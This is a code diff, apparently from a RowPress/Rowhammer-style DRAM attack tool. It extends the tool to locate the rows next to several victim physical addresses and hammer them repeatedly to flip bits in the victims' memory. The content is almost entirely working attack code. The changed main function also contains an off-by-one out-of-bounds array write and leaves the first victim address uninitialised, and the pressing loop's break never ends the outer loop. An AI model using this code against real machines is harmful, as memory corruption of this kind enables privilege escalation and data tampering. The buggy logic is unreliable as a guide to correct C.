@@ -63,59 +63,53 @@ void press_all() {
     }
 }
 
-void press_one(uint64_t victim) {
+void press_one(uint64_t *victims, int num_victims) {
     uint64_t mem_size = 1.8 * BUFFER_SIZE;
-    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
-    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 
+    uint64_t* attacker_1 = (uint64_t*) calloc(num_victims, sizeof(uint64_t));
+    uint64_t* attacker_2 = (uint64_t*) calloc(num_victims, sizeof(uint64_t)); 
+    uint64_t* victims_virt_addr = (uint64_t*) calloc(num_victims, sizeof(uint64_t));
 
     while (true) {
-        printf("Attempting to locate physical address\n");
+        printf("Attempting to locate physical addresses\n");
         void *temp = allocate_pages(mem_size);
         deallocate_pages(allocated_mem, mem_size);
         allocated_mem = temp;
         setup_PPN_VPN_map(allocated_mem, mem_size);
 
-        // row + 1, row - 1
-        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) {
-            printf("Found addresses, pressing now\n");
+        int i;
+        for (i = 0; i < num_victims; i++) {
+            if (get_addresses_to_hammer(victims[i], &attacker_1[i], &attacker_2[i], 1)) {
+                printf("Located victim %d\n", i);
+                victims_virt_addr[i] = phys_to_virt(victims[i]);
+            } else {
+                printf("Could not find victim %d. Trying again for all victims\n", i);
+                break;
+            }
+        }
+        if (i == num_victims) {
+            printf("Located all address. Will start pressing now.\n");
             break;
         }
     }
 
-    uint64_t victim_virt = phys_to_virt(victim);
-
     while (true) {
-        uint32_t num_bit_flips = press(victim_virt, *attacker_1, *attacker_2);
-        if (num_bit_flips > 0) break;
+        for (int i = 0; i < num_victims; i++) {
+            uint32_t num_bit_flips = press(victims_virt_addr[i], attacker_1[i], attacker_2[i]);
+            if (num_bit_flips > 0) break;
+        }
     }
 }
 
 int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
-    
-    int opt;
-    bool flag_press_all = true;
-    uint64_t victim; 
-    while((opt = getopt(argc, argv, "hp:")) != -1)  
-    {  
-        switch(opt)  
-        {  
-            case 'p':   
-                victim = strtol(optarg, NULL, 10);
-                flag_press_all = false;
-                break; 
-            case 'h':
-            case '?':
-                printf("Usage: %s [-p]\n", argv[0]);
-                printf("-p\t specific victim physical address to attack\n");
-                printf("If no specific address is passed, it will try to press on random addresses until it finds a bit flip\n");  
-                exit(0);
-        }  
-    }
-    if (flag_press_all) {
+    if (argc == 1) {
         press_all();
     } else {
-        press_one(victim);
+        uint64_t victims[argc - 1];
+        for (int i = 1; i < argc; i++) {
+            victims[i] = strtol(argv[i], NULL, 10);
+        }
+        press_one(victims, argc - 1);
     }
 }
 
